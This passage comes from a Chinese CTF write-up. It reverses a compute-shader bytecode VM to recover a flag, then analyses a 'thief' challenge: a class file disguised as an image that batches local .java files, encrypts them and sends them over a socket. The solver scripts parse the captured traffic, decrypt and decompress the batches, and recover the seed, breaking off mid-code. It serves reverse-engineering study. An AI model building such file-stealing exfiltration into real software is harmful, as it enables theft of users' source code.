    sub_180157800(&Method_System_Threading_Tasks_Task_byte____GetAwaiter__, v14);
    byte_180F4C9B1 = 1;
  }
  *(_QWORD *)&awaiter_.fields.m_continueOnCapturedContext = 0;
  awaiter_.fields.m_task = 0;
  __4__this = (Il2CppObject *)this->fields.__4__this;
  switch ( this->fields.__1__state )
  {
    case 0:
      *(_QWORD *)&awaiter_.fields.m_continueOnCapturedContext = this->fields.__u__1.fields.m_task;
      this->fields.__u__1.fields.m_task = 0;
      this->fields.__1__state = -1;
      goto LABEL_13;
    case 1:
      awaiter_.fields.m_task = (struct System_Threading_Tasks_Task_TResult__o *)this->fields.__u__2.fields.m_task;
      this->fields.__u__2.fields.m_task = 0;
      this->fields.__1__state = -1;
      goto LABEL_17;
    case 2:
      awaiter_.fields.m_task = (struct System_Threading_Tasks_Task_TResult__o *)this->fields.__u__2.fields.m_task;
      this->fields.__u__2.fields.m_task = 0;
      this->fields.__1__state = -1;
      goto LABEL_20;
    case 3:
      awaiter_.fields.m_task = (struct System_Threading_Tasks_Task_TResult__o *)this->fields.__u__2.fields.m_task;
      this->fields.__u__2.fields.m_task = 0;
      this->fields.__1__state = -1;
      goto LABEL_23;
    case 4:
      awaiter_.fields.m_task = (struct System_Threading_Tasks_Task_TResult__o *)this->fields.__u__2.fields.m_task;
      this->fields.__u__2.fields.m_task = 0;
      this->fields.__1__state = -1;
      goto LABEL_26;
    case 5:
      awaiter_.fields.m_task = (struct System_Threading_Tasks_Task_TResult__o *)this->fields.__u__2.fields.m_task;
      this->fields.__u__2.fields.m_task = 0;
      this->fields.__1__state = -1;
      goto LABEL_29;
  
}
```

状态机的加密逻辑很清晰，从case0到case5依次：

case0：调用Controller___Check_b__18_0_d()：从输入框取字符串，解析出{}包裹的 16 字节 bytes case1：await Controller___Check_b__18_1_d：把这 16 字节写到一张 16×1 的纹理里 case2-case4：await Controller___Check_b__18_2_d连续跑三轮，调用 compute shader 的 kernel K0进行加密 case5：await Controller___Check_b__18_3_d：调用 kernel K1进行逐字节比对，失败写 SharedState 最后 UI 逻辑用 kernel K2 根据 SharedState 显示 Correct/Wrong

使用AssetRipper提取得到资源文件shader.assets，提取K0 K1 K2三个dxbc。提取后用dxdec反编译得到三个kernel的汇编代码：

K0:

```Java
cs_5_0
dcl_globalFlags refactoringAllowed
dcl_resource_texture2d (float,float,float,float) t0
dcl_uav_typed_texture2d (float,float,float,float) u0
dcl_temps 5
dcl_indexableTemp x0[16], 4
dcl_indexableTemp x1[32], 4
dcl_thread_group 1, 1, 1
mov x1[0].x, l(0)
mov x1[1].x, l(0)
mov x1[2].x, l(0)
mov x1[3].x, l(0)
mov x1[4].x, l(0)
mov x1[5].x, l(0)
mov x1[6].x, l(0)
mov x1[7].x, l(0)
mov x1[8].x, l(0)
mov x1[9].x, l(0)
mov x1[10].x, l(0)
mov x1[11].x, l(0)
mov x1[12].x, l(0)
mov x1[13].x, l(0)
mov x1[14].x, l(0)
mov x1[15].x, l(0)
mov x1[16].x, l(0)
mov x1[17].x, l(0)
mov x1[18].x, l(0)
mov x1[19].x, l(0)
mov x1[20].x, l(0)
mov x1[21].x, l(0)
mov x1[22].x, l(0)
mov x1[23].x, l(0)
mov x1[24].x, l(0)
mov x1[25].x, l(0)
mov x1[26].x, l(0)
mov x1[27].x, l(0)
mov x1[28].x, l(0)
mov x1[29].x, l(0)
mov x1[30].x, l(0)
mov x1[31].x, l(0)
mov x0[0].x, l(0)
mov x0[1].x, l(0)
mov x0[2].x, l(0)
mov x0[3].x, l(0)
mov x0[4].x, l(0)
mov x0[5].x, l(0)
mov x0[6].x, l(0)
mov x0[7].x, l(0)
mov x0[8].x, l(0)
mov x0[9].x, l(0)
mov x0[10].x, l(0)
mov x0[11].x, l(0)
mov x0[12].x, l(0)
mov x0[13].x, l(0)
mov x0[14].x, l(0)
mov x0[15].x, l(0)
resinfo_indexable(texture2d)(float,float,float,float)_uint r0.x, l(0), t0.xyzw
mov r1.yzw, l(0,0,0,0)
mov r2.yz, l(0,0,-1,0)
mov r3.xz, l(0,0,0,0)
mov r0.yz, l(0,0,0,0)
loop 
  uge r0.w, r0.z, l(1024)
  breakc_nz r0.w
  uge r0.w, r3.x, r0.x
  or r0.w, r0.w, r3.z
  if_nz r0.w
    break 
  endif 
  mov r2.x, r3.x
  ld_indexable(texture2d)(float,float,float,float) r4.xyzw, r2.xyyy, t0.xyzw
  mul r4.xyzw, r4.xyzw, l(255, 255, 255, 255)
  ftou r4.xyzw, r4.xyzw
  switch r4.x
    case l(0)
    mov x1[r4.y + 0].x, r4.w
    iadd r3.x, r3.x, l(1)
    break 
    case l(1)
    mov r0.w, x1[r4.z + 0].x
    and r1.x, r0.w, l(15)
    ld_uav_typed_indexable(texture2d)(float,float,float,float) r0.w, r1.xyzw, u0.yzwx
    mul r0.w, r0.w, l(255)
    round_ne r0.w, r0.w
    ftou r0.w, r0.w
    and r0.w, r0.w, l(255)
    mov x1[r4.y + 0].x, r0.w
    iadd r3.x, r3.x, l(1)
    break 
    case l(2)
    mov r0.w, x1[r4.y + 0].x
    mov r1.x, x1[r4.z + 0].x
    xor r0.w, r0.w, r1.x
    and r0.w, r0.w, l(255)
    mov x1[r4.y + 0].x, r0.w
    iadd r3.x, r3.x, l(1)
    break 
    case l(3)
    mov r0.w, x1[r4.y + 0].x
    mov r1.x, x1[r4.z + 0].x
    and r1.x, r1.x, l(7)
    and r2.w, r0.w, l(255)
    bfi r0.w, l(8), r1.x, r0.w, l(0)
    iadd r1.x, -r1.x, l(8)
    ushr r1.x, r2.w, r1.x
    or r0.w, r0.w, r1.x
    and r0.w, r0.w, l(255)
    mov x1[r4.y + 0].x, r0.w
    iadd r3.x, r3.x, l(1)
    break 
    case l(4)
    mov r0.w, x1[r4.z + 0].x
    and r1.x, r4.w, l(255)
    imul null, r0.w, r0.w, r1.x
    and r0.w, r0.w, l(255)
    mov x1[r4.y + 0].x, r0.w
    iadd r3.x, r3.x, l(1)
    break 
    case l(5)
    mov r0.w, x1[r4.z + 0].x
    and r1.x, r4.w, l(255)
    iadd r0.w, r0.w, r1.x
    and r0.w, r0.w, l(255)
    mov x1[r4.y + 0].x, r0.w
    iadd r3.x, r3.x, l(1)
    break 
    case l(6)
    mov r0.w, x1[r4.y + 0].x
    mov r1.x, x1[r4.z + 0].x
    iadd r0.w, r0.w, r1.x
    and r0.w, r0.w, l(255)
    mov x1[r4.y + 0].x, r0.w
    iadd r3.x, r3.x, l(1)
    break 
    case l(7)
    mov r0.w, x1[r4.y + 0].x
    and r0.w, r0.w, l(15)
    mov r1.x, x1[r4.z + 0].x
    and r1.x, r1.x, l(255)
    mov x0[r0.w + 0].x, r1.x
    iadd r3.x, r3.x, l(1)
    break 
    case l(8)
    mov r0.w, x1[r4.y + 0].x
    and r1.x, r4.w, l(255)
    ult r0.y, r0.w, r1.x
    iadd r3.x, r3.x, l(1)
    break 
    case l(9)
    and r0.w, r4.w, l(128)
    iadd r1.x, r4.w, l(-256)
    movc r0.w, r0.w, r1.x, r4.w
    iadd r3.y, r0.w, r3.x
    ilt r0.w, r3.y, l(0)
    ige r1.x, r3.y, r0.x
    or r0.w, r0.w, r1.x
    movc r2.xw, r0.wwww, r2.xxxz, r3.yyyz
    iadd r3.x, r3.x, l(1)
    movc r3.xz, r0.yyyy, r2.xxwx, r3.xxzx
    break 
    default 
    mov r3.z, l(-1)
    break 
  endswitch 
  iadd r0.z, r0.z, l(1)
endloop 
mov r0.x, x0[0].x
mov r0.y, x0[1].x
mov r0.z, x0[2].x
mov r0.w, x0[3].x
mov r1.x, x0[4].x
mov r1.y, x0[5].x
mov r1.z, x0[6].x
mov r1.w, x0[7].x
mov r2.x, x0[8].x
mov r2.y, x0[9].x
mov r2.z, x0[10].x
mov r2.w, x0[11].x
mov r3.x, x0[12].x
mov r3.y, x0[13].x
mov r3.z, x0[14].x
mov r3.w, x0[15].x
utof r0.x, r0.x
mul r4.x, r0.x, l(0.003921569)
mov r4.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(0, 0, 0, 0), r4.xyzw
utof r0.x, r0.y
mul r4.x, r0.x, l(0.003921569)
mov r4.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(1, 0, 0, 0), r4.xyzw
utof r0.x, r0.z
mul r4.x, r0.x, l(0.003921569)
mov r4.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(2, 0, 0, 0), r4.xyzw
utof r0.x, r0.w
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(3, 0, 0, 0), r0.xyzw
utof r0.x, r1.x
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(4, 0, 0, 0), r0.xyzw
utof r0.x, r1.y
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(5, 0, 0, 0), r0.xyzw
utof r0.x, r1.z
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(6, 0, 0, 0), r0.xyzw
utof r0.x, r1.w
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(7, 0, 0, 0), r0.xyzw
utof r0.x, r2.x
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(8, 0, 0, 0), r0.xyzw
utof r0.x, r2.y
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(9, 0, 0, 0), r0.xyzw
utof r0.x, r2.z
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(10, 0, 0, 0), r0.xyzw
utof r0.x, r2.w
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(11, 0, 0, 0), r0.xyzw
utof r0.x, r3.x
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(12, 0, 0, 0), r0.xyzw
utof r0.x, r3.y
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(13, 0, 0, 0), r0.xyzw
utof r0.x, r3.z
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(14, 0, 0, 0), r0.xyzw
utof r0.x, r3.w
mul r0.x, r0.x, l(0.003921569)
mov r0.yzw, l(0,0,0,1)
store_uav_typed u0.xyzw, l(15, 0, 0, 0), r0.xyzw
ret 
```

K1:

```Java
cs_5_0
dcl_globalFlags refactoringAllowed
dcl_resource_texture2d (float,float,float,float) t0
dcl_uav_typed_texture2d (float,float,float,float) u0
dcl_uav_structured u1, 4
dcl_input vThreadID.x
dcl_temps 2
dcl_thread_group 16, 1, 1
mov r0.x, vThreadID.x
mov r0.yzw, l(0,0,0,0)
ld_uav_typed_indexable(texture2d)(float,float,float,float) r1.x, r0.xwww, u0.xyzw
mul r1.x, r1.x, l(255)
round_ne r1.x, r1.x
ftou r1.x, r1.x
and r1.x, r1.x, l(255)
iadd r1.x, r1.x, vThreadID.x
and r1.x, r1.x, l(255)
ld_indexable(texture2d)(float,float,float,float) r0.x, r0.xyzw, t0.xyzw
mul r0.x, r0.x, l(255)
round_ne r0.x, r0.x
ftou r0.x, r0.x
and r0.x, r0.x, l(255)
ine r0.x, r0.x, r1.x
if_nz r0.x
  store_structured u1.x, l(0), l(0), l(1)
endif 
ret 
```

K2:

```Java
dcl_globalFlags refactoringAllowed
dcl_constantbuffer CB0[2], immediateIndexed
dcl_sampler s0, mode_default
dcl_resource_texture2d (float,float,float,float) t0
dcl_resource_texture2d (float,float,float,float) t1
dcl_uav_typed_texture2d (float,float,float,float) u0
dcl_uav_structured u1, 4
dcl_input vThreadID.xy
dcl_temps 4
dcl_thread_group 8, 8, 1
resinfo_indexable(texture2d)(float,float,float,float)_uint r0.xy, l(0), u0.xyzw
uge r0.zw, vThreadID.xxxy, r0.xxxy
or r0.z, r0.w, r0.z
if_nz r0.z
  ret 
endif 
utof r0.zw, vThreadID.yyyx
utof r0.xy, r0.yxyy
div r0.xy, r0.zwzz, r0.xyxx
mad r0.xy, r0.xyxx, cb0[0].wzww, l(-0.5, -0.5, 0, 0)
resinfo_indexable(texture2d)(float,float,float,float)_uint r0.zw, l(0), t0.zwxy
utof r0.zw, r0.wwwz
div r0.z, r0.z, r0.w
sincos r1.x, r2.x, cb0[1].x
mul r1.xy, r0.xyxx, r1.xxxx
mad r3.x, r0.y, r2.x, -r1.x
mad r0.y, r0.x, r2.x, r1.y
div r3.y, r0.y, r0.z
add r0.yz, r3.xxyx, l(0, 0.5, 0.5, 0)
ld_structured_indexable(structured_buffer, stride=4)(mixed,mixed,mixed,mixed) r0.w, l(0), l(0), u1.xxxx
ieq r1.x, r0.w, l(1)
if_z r0.w
  mad r1.yz, cb0[0].xxyx, cb0[1].yyyy, r0.yyzy
  sample_l_indexable(texture2d)(float,float,float,float) r2.xyzw, r1.yzyy, t0.xyzw, s0, l(0)
else 
  mov r2.xyzw, l(0,0,0,1)
endif 
if_nz r1.x
  mad r0.yz, -cb0[0].xxyx, cb0[1].yyyy, r0.yyzy
  sample_l_indexable(texture2d)(float,float,float,float) r2.xyzw, r0.yzyy, t1.xyzw, s0, l(0)
endif 
add r1.xyzw, -r2.xyzw, l(0, 0, 0, 1)
mad r0.xyzw, r0.xxxx, r1.xyzw, r2.xyzw
store_uav_typed u0.xyzw, vThreadID.xyyy, r0.xyzw
ret 
```

K0：单线程解释执行 coTex里的 RGBA 字节码维护 mem[32] 和 reg[16]，按 opcode 做立即数赋值、从 WorkTex(u0) 读字节、XOR、8-bit 循环移位、乘法/加法混淆、比较设条件与条件跳转；执行结束后把 reg[0..15] 归一化为 float 写回 WorkTex 的 16×1 像素。

K1：每个线程处理一个 i（0..15）：从 WorkTex(u0) 读 work[i]（red*255 取整 &255），计算 ((work[i] + i) & 0xFF)，再从 ciTex(t0) 读 ci[i]（同样取整 &255），若 ci[i] != ((work[i] + i) & 0xFF) 就把 SharedState[0]（u1[0]）写成 1 表示失败；等价通过条件是 work[i] = (ci[i] - i) & 0xFF。

K2：典型 tile 渲染/后处理：对输出纹理 u0 的每个像素做边界检查后，按常量缓冲 CB0 计算归一化坐标并做 sincos 旋转/缩放偏移；根据 SharedState[0]（u1[0]）选择采样 t0（状态=0）或 t1（状态=1，否则输出黑），再按 r0.x 做一次向黑/alpha=1 的线性淡出混合，最后写回 u0

VM字节码和比较值来自于coTex.png和ciTex.png，写脚本提取出来：

```Python
from PIL import Image

img = Image.open("ciTex.png").convert("RGBA")
w, h = img.size

px = img.load()
ci = [px[x, 0][0] for x in range(w)]  
print(ci)

t = [(ci[i] - i) & 0xFF for i in range(len(ci))]
print("target :", t)
from PIL import Image

img = Image.open("coTex.png").convert("RGBA")
w, h = img.size
assert h == 1, f"expected 1xH image, got {w}x{h}"

rgba = [img.getpixel((x, 0)) for x in range(w)]  
print(rgba)
```

得到：

```Rust
ci: [233, 142, 138, 138, 183, 231, 201, 224, 184, 151, 183, 75, 59, 33, 211, 124]
target : [233, 141, 136, 135, 179, 226, 195, 217, 176, 142, 173, 64, 47, 20, 197, 109]
[(0, 1, 0, 42), (0, 2, 0, 0), (1, 0, 2, 0), (2, 0, 1, 0), (3, 0, 2, 0), (4, 0, 0, 7), (6, 0, 2, 0), (7, 2, 0, 0), (6, 1, 0, 0), (5, 2, 2, 1), (8, 2, 0, 16), (9, 0, 0, 247), (10, 0, 0, 0)]
```

VM字节码梳理过后是如下逻辑：

```Rust
初始 state = 42
对每个 i：
v = inp[i] ^ state
v = rol8(v, i)
v = (v * 7) & 0xFF
v = (v + i) & 0xFF
out[i] = v
state = (state + out[i]) & 0xFF
```

7 mod 256 可逆，逆元为183，写逆为：

```Rust
初始 state = 42
对每个 i，已知 out[i]=o：
w = (o - i) & 0xFF
u = (w * 183) & 0xFF 
v = ror8(u, i) 
inp[i] = v ^ state
state = (state + o) & 0xFF
```

连续逆三轮即可，exp如下：

```Python
def rol8(x, s): s &= 7; return ((x << s) | (x >> (8 - s))) & 0xFF
def ror8(x, s): s &= 7; return ((x >> s) | (x << (8 - s))) & 0xFF
INV7 = 183  
def Finv(out):
    state = 42
    inp = []
    for i, o in enumerate(out):
        w = (o - i) & 0xFF
        u = (w * INV7) & 0xFF
        v = ror8(u, i)
        inp.append(v ^ state)
        state = (state + o) & 0xFF
    return inp

ci = [233,142,138,138,183,231,201,224,184,151,183,75,59,33,211,124]
t  = [(ci[i] - i) & 0xFF for i in range(16)]

x = t
for _ in range(3):
    x = Finv(x)

print(bytes(x).decode('ascii')) 
```

flag为：`alictf{5haderVM_Rep3at!}`

## thief

unkown.zip里藏的.webp魔数是cafebabe，实际上是.class文件

梳理逻辑，整体逻辑如下：

在某个根目录（user.dir 的 parent）下递归搜集最多 9 个 .java 文件

每 3 个文件为一批，然后进行如下操作：

1. 读取文件内容
2. 用自定义 LZRR 压缩（每个文件独立压缩块）
3. 拼接所有块
4. 生成随机 8 字节会话 key，并把它用 RSA(65537) 公钥加密写进包头
5. 用 Runner.encrypt(algo2/3, data, key) 对 payload 加密/混淆
6. 将结果通过 Socket 发往 127.0.0.1:8889

那么首先从流量包里解析3 个 batch payload

```Python
import struct
import collections
from pathlib import Path

PCAP = Path("dump.pcapng")
OUT  = Path("batches")
OUT.mkdir(parents=True, exist_ok=True)

def parse_pcapng(path: Path):
    b = path.read_bytes()
    off = 0
    interfaces = []
    packets = []  # (iface_id, ts, caplen, pktlen, pktdata)

    while off + 12 <= len(b):
        block_type, total_len = struct.unpack_from("<II", b, off)
        if total_len < 12 or off + total_len > len(b):
            break
        body = b[off+8 : off+total_len-4]
        if block_type == 0x00000001:  # IDB
            linktype, _, snaplen = struct.unpack_from("<HHi", body, 0)
            interfaces.append({"linktype": linktype, "snaplen": snaplen})
        elif block_type == 0x00000006:  # EPB
            iface_id, ts_high, ts_low, caplen, pktlen = struct.unpack_from("<IIIII", body, 0)
            pkt_data = body[20:20+caplen]
            ts = (ts_high << 32) | ts_low
            packets.append((iface_id, ts, caplen, pktlen, pkt_data))
        off += total_len

    return interfaces, packets

def ipv4_parse(pkt: bytes):
    if len(pkt) < 20:
        return None
    vihl = pkt[0]
    ver = vihl >> 4
    ihl = (vihl & 0x0F) * 4
    if ver != 4 or len(pkt) < ihl:
        return None
    total_len = struct.unpack_from(">H", pkt, 2)[0]
    proto = pkt[9]
    src = ".".join(map(str, pkt[12:16]))
    dst = ".".join(map(str, pkt[16:20]))
    payload = pkt[ihl:total_len]
    return {"proto": proto, "src": src, "dst": dst, "payload": payload}

def tcp_parse(seg: bytes):
    if len(seg) < 20:
        return None
    sport, dport, seq, ack, off_flags, *_ = struct.unpack_from(">HHIIHHHH", seg, 0)
    off = (off_flags >> 12) * 4
    if len(seg) < off:
        return None
    payload = seg[off:]
    return {"sport": sport, "dport": dport, "seq": seq, "ack": ack, "payload": payload}

def reassemble(segments):
    segs = [s for s in segments if s[2]]  # (seq, ts, payload)
    segs.sort(key=lambda x: x[0])
    out = bytearray()
    base = segs[0][0]
    cur = base
    for seq, ts, payload in segs:
        if seq > cur:
            out.extend(b"\x00" * (seq - cur))
            cur = seq
        if seq < cur:
            start = cur - seq
            if start < len(payload):
                out.extend(payload[start:])
                cur += len(payload) - start
        else:
            out.extend(payload)
            cur += len(payload)
    return bytes(out)

def parse_app_payload(blob: bytes):
    assert blob[:4] == b"\x89ali", "bad magic"
    batch = struct.unpack_from("<I", blob, 4)[0]
    rsa_len = struct.unpack_from("<I", blob, 8)[0]
    off = 12
    rsa = blob[off:off+rsa_len]
    off += rsa_len
    file_count = struct.unpack_from("<I", blob, off)[0]
    off += 4

    files = []
    for _ in range(file_count):
        name_len = struct.unpack_from("<I", blob, off)[0]; off += 4
        name_xor = blob[off:off+name_len]; off += name_len
        name = bytes([c ^ 233 for c in name_xor]).decode("utf-8", "replace")
        foff = struct.unpack_from("<I", blob, off)[0]; off += 4
        files.append((name, foff))

    cipher = blob[off:]
    return batch, rsa, files, cipher

def main():
    ifaces, pkts = parse_pcapng(PCAP)

    # 只关心：DLT_NULL(0) + AF_INET(2) + TCP
    streams = collections.defaultdict(list)  # key=(src_ip, sport, dst_ip, dport)
    for iface_id, ts, caplen, pktlen, pktdata in pkts:
        if ifaces[iface_id]["linktype"] != 0:
            continue
        fam = struct.unpack_from("<I", pktdata, 0)[0]
        if fam != 2:
            continue
        ip = ipv4_parse(pktdata[4:])
        if not ip or ip["proto"] != 6:
            continue
        tcp = tcp_parse(ip["payload"])
        if not tcp:
            continue
        key = (ip["src"], tcp["sport"], ip["dst"], tcp["dport"])
        streams[key].append((tcp["seq"], ts, tcp["payload"]))

    # 找 client->server（dport=8889）的 3 条流并解析 payload
    for key in streams:
        if key[3] != 8889:
            continue
        blob = reassemble(streams[key])
        batch, rsa, files, cipher = parse_app_payload(blob)

        (OUT / f"batch{batch}_rsa.bin").write_bytes(rsa)
        (OUT / f"batch{batch}_cipher.bin").write_bytes(cipher)

        # 顺便把文件表写出来方便后续
        with open(OUT / f"batch{batch}_files.txt", "w", encoding="utf-8") as f:
            for name, off in files:
                f.write(f"{off}\t{name}\n")

        print(f"[+] batch {batch}: rsa={len(rsa)} bytes, files={len(files)}, cipher={len(cipher)} bytes")

if __name__ == "__main__":
    main()
```

解析完得到：

```Rust
0        unknown/app/src/main/java/com/unknown/AbstractPatternMachine.java
3576        flagImage/Image1Part3.java
21277        flagImage/Image1Part1.java
0        unknown/app/src/main/java/com/unknown/ParticlePhysicsSimulator.java
3577        flagImage/Image1Part4.java
21084        flagImage/Image1Part2.java
0        unknown/app/src/main/java/com/unknown/GeneticAlgorithmEngine.java
3080        flagImage/Image1Part5.java
22774        flagImage/Image1Part6.java
```

flag被分成了六份，需要解密RSA并且解 LZRR 压缩

batch1和3的key加密不依赖于seed，流密码直接xor，然后key 是base64 字符串，存在 l1I.webp（类 i.l.l1I）的常量池里。

写个脚本提取一下

```Python
import struct, re
from pathlib import Path

CLASS = Path("app/src/main/res/mipmap-hdpi/l1I.webp").read_bytes()

def utf8_strings(class_bytes: bytes):
    cp_count = struct.unpack_from(">H", class_bytes, 8)[0]
    off = 10
    res = []
    i = 1
    while i < cp_count:
        tag = class_bytes[off]; off += 1
        if tag == 1:
            ln = struct.unpack_from(">H", class_bytes, off)[0]; off += 2
            s  = class_bytes[off:off+ln].decode("utf-8", "replace"); off += ln
            res.append(s)
        elif tag in (3,4): off += 4
        elif tag in (5,6): off += 8; i += 1
        elif tag in (7,8,16,19,20): off += 2
        elif tag in (9,10,11,12,17,18): off += 4
        elif tag == 15: off += 3
        else: raise ValueError(tag)
        i += 1
    return res

cands = [s for s in utf8_strings(CLASS) if s.startswith("azQyMw") and len(s) > 1000]
assert len(cands) == 2

Path("key0.b64").write_text(cands[0], encoding="utf-8")
Path("key1.b64").write_text(cands[1], encoding="utf-8")
```

 写一个decrypt.java去调用 `i.l.Runner.encrypt()`进行解密

```Java
import java.nio.file.*;
import java.util.Base64;
import i.l.Runner;

public class Decrypt {
    public static void main(String[] args) throws Exception {
        if (args.length != 4) {
            System.err.println("Usage: java Decrypt <key.b64> <seedHex(16)> <in.bin> <out.bin>");
            return;
        }
        byte[] key = Base64.getDecoder().decode(Files.readAllBytes(Paths.get(args[0])));
        long seed  = Long.parseUnsignedLong(args[1], 16);
        byte[] in  = Files.readAllBytes(Paths.get(args[2]));
        byte[] out = Runner.encrypt(key, in, seed);
        Files.write(Paths.get(args[3]), out);
    }
}
```

然后seed随便给就行，类似于：

```Bash
java -cp work/recovered_classes:. Decrypt work/key1.b64 0000000000000000 \
  work/batches/batch1_cipher.bin work/out/batch1_plain.bin

java -cp work/recovered_classes:. Decrypt work/key1.b64 0000000000000000 \
  work/batches/batch3_cipher.bin work/out/batch3_plain.bin
```

得到解密后的bin

Il1.Il1(byte[])` 是压缩器,解压缩:

```Python
import struct, zlib

def _bit_iter(data: bytes, start: int):
    for byte in data[start:]:
        for i in range(7, -1, -1):
            yield (byte >> i) & 1

def _read_bits(bits, n: int) -> int:
    v = 0
    for _ in range(n):
        v = (v << 1) | next(bits)
    return v

def lzrr_decompress(comp: bytes) -> bytes:
    if len(comp) < 16:
        raise ValueError("too short")
    magic = struct.unpack_from(">I", comp, 0)[0]
    if magic != 0x4c5a5252:
        raise ValueError("bad magic")
    ver = struct.unpack_from(">H", comp, 4)[0]
    if ver != 513:
        raise ValueError("bad ver")

    orig_len = struct.unpack_from(">I", comp, 8)[0]
    crc      = struct.unpack_from(">I", comp, 12)[0]

    bits = _bit_iter(comp, 16)
    out = bytearray()

    while len(out) < orig_len:
        t = next(bits)
        if t == 0:
            out.append(_read_bits(bits, 8))
        else:
            # offset
            if next(bits) == 0:
                offset = _read_bits(bits, 8)
            else:
                offset = _read_bits(bits, 16)

            # length
            if next(bits) == 0:
                length = 3 + _read_bits(bits, 3)
            else:
                if next(bits) == 0:
                    length = 3 + 8 + _read_bits(bits, 6)
                else:
                    length = 3 + _read_bits(bits, 8)

            start = len(out) - offset
            for i in range(length):
                out.append(out[start + i])

    out = bytes(out[:orig_len])

    # 可选校验
    if (zlib.crc32(out) & 0xffffffff) != crc:
        pass

    return out
```

文件表里给的是每个文件在“明文流”里的 offset。明文流结构就是：

[file0 LZRR blob][file1 LZRR blob][file2 LZRR blob]...需要文件切片

调用解码器去解压并切片：

```Python
from pathlib import Path
from lzrr import lzrr_decompress

def read_file_table(path: Path):
    items = []
    for line in path.read_text(encoding="utf-8").splitlines():
        off, name = line.split("\t", 1)
        items.append((int(off), name))
    items.sort()
    return items

def unpack_one(batch_id: int):
    base = Path("work")
    plain = (base / "out" / f"batch{batch_id}_plain.bin").read_bytes()
    table = read_file_table(base / "batches" / f"batch{batch_id}_files.txt")
    out_dir = base / "out" / f"batch{batch_id}_files"
    out_dir.mkdir(parents=True, exist_ok=True)

    for i, (off, name) in enumerate(table):
        end = table[i+1][0] if i+1 < len(table) else len(plain)
        comp = plain[off:end]
        data = lzrr_decompress(comp)
        (out_dir / name).write_bytes(data)

if name == "main":
    unpack_one(1)
    unpack_one(3)
```

每个 Image1Part 是：private static final String IMAGE_DATA = "....base64....";写脚本提取出来即可

提取脚本：

```Python
import re, base64
from pathlib import Path

def extract_jpg(java_path: Path, out_path: Path):
    s = java_path.read_text(encoding="utf-8", errors="ignore")
    m = re.search(r'IMAGE_DATA\s*=\s*"([^"]+)"', s)
    assert m, "no IMAGE_DATA"
    b64 = m.group(1)
    out_path.write_bytes(base64.b64decode(b64))
    
  extract_jpg(Path("out/batch3_files/flagImage_Image1Part3.java"),
            Path("out/flag_part_3.jpg"))
```

解压解密后得到flag part 1，3，5，6

对于batch2，利用明文线性仿射得到seed

用题目压缩器 Il1 压缩 ParticlePhysicsSimulator.java

用一个 Java wrapper 调 `i.l.Il1.Il1(byte[])`：

```Java
import java.nio.file.*;
import i.l.Il1;

public class Compress {
    public static void main(String[] args) throws Exception {
        byte[] in = Files.readAllBytes(Paths.get(args[0]));
        byte[] out = Il1.Il1(in);
        System.out.write(out);
    }
}
```

编译并运行：

```Rust
javac -cp work/recovered_classes Compress.java
java -cp work/recovered_classes:. Compress \
  work/unknown_zip/app/src/main/java/com/unknown/ParticlePhysicsSimulator.java \
  > work/out/pps_comp.bin
```

计算 keystream：K = C XOR P

取 batch2 ciphertext 的前 3577 bytes，和 pps_comp.bin xor：

```Python
from pathlib import Path

C = (Path("work/batches/batch2_cipher.bin").read_bytes())[:3577]
P = Path("work/out/pps_comp.bin").read_bytes()
K = bytes([a ^ b for a, b in zip(C, P)])  # keystream 前缀
Path("work/out/ks_prefix.bin").write_bytes(K)
```

我们可以用 `Runner.encrypt(key0, zeros, seed)` 直接得到 `K(seed)`（因为输入全 0，输出就是 keystream）。 而：

```Rust
K(s1) XOR K(s2) XOR K(0) == K(s1 XOR s2)
```

这说明是仿射线性：`K(seed) = K(0) XOR (A * seed_bits)`。

因此用 64 个 basis seed（`1<<i`）采样就能建立线性方程组，做高斯消元解出 seed。

```Python
import subprocess
from pathlib import Path

JAVA_CP = "recovered_classes:."
KEY0    = "key0.b64"
ZEROS64 = "out/zeros64.bin"
OUTTMP  = "out/_ks_tmp.bin"

Path(ZEROS64).write_bytes(b"\x00"*64)

def keystream64(seed_hex: str) -> bytes:
    subprocess.run(
        ["java", "-cp", JAVA_CP, "Decrypt", KEY0, seed_hex, ZEROS64, OUTTMP],
        check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    return Path(OUTTMP).read_bytes()

def xor_bytes(a,b): return bytes(x^y for x,y in zip(a,b))

def bytes_to_bits_le(b: bytes):
    bits=[]
    for byte in b:
        for k in range(8):
            bits.append((byte>>k)&1)  # 低位->高位：只要一致即可
    return bits

def solve_seed_from_keystream(K_obs: bytes, prefix_bytes=16) -> int:
    K0 = keystream64("0000000000000000")[:prefix_bytes]
    d  = xor_bytes(K_obs[:prefix_bytes], K0)
    d_bits = bytes_to_bits_le(d)
    n_eq = len(d_bits)

    # columns[i] 是 seed 第 i 位对输出 bits 的贡献
    cols = []
    for i in range(64):
        Ki = keystream64(f"{1<<i:016x}")[:prefix_bytes]
        cols.append(bytes_to_bits_le(xor_bytes(Ki, K0)))

    # 组装为 row 方程：rows[j] 是第 j 条方程的 64-bit 系数
    rows = []
    rhs  = []
    for j in range(n_eq):
        coeff = 0
        for i in range(64):
            if cols[i][j]:
                coeff |= (1<<i)
        rows.append(coeff)
